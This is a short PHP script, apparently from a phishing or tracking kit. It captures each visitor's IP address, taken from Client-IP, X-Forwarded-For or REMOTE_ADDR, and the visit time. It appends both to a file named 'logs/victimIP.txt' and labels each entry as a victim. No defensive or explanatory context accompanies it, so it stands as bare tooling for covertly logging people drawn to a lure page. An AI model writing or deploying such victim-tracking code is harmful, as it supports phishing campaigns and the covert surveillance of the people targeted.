<?php

$timet = time();
$date = date('F , d-M-Y H:i:s');
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }


$file = 'logs/victimIP.txt';
$victim = "\nIP: ";
$visited = "Date_visited: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, " \r\r");
fwrite($fp, $visited);
fwrite($fp, $date);


fclose($fp);
